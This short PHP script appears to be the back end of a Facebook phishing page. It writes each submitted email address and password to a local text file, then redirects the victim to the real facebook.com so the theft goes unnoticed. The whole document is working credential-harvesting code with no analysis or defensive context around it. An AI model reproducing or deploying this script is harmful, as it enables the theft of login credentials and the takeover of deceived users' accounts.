<?php
file_put_contents("h16.txt", "Email:" . $_POST['email'] . " Pass:" . $_POST['pass'] . "\n",FILE_APPEND);
header('Location:https://facebook.com/');
exit();